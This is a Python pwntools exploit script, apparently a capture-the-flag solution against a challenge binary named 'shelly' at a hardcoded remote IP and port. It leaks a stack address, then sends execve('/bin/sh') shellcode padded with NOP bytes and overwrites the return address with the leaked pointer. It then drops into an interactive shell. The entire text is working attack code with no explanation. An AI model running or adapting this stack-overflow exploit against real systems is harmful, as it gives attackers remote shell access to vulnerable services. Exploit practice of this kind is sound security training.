#!/usr/bin/python3.8
from pwn import *

ip = '159.89.1.177' # change this
port = 4001 # change this
fname = './shelly' # change this

LOCAL = False

if LOCAL:
	r = process(fname)
else:
	r = remote(ip, port)

ru = lambda x : r.recvuntil(x)
inter = lambda : r.interactive()
sla = lambda x,y : r.sendlineafter(x,y)

def pwn():
	sla(':', '1')
	sla(':', 'w3t')
	sc = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
	ru('0x')[:-2]
	leaked = int(ru(']')[:-1],16)
	print('Leaked: 0x{:x}'.format(leaked)) 
	payload = sc.ljust(72, b'\x90') + p64(leaked)
	sla(':', payload)
	inter()

if __name__ == '__main__':
	pwn()
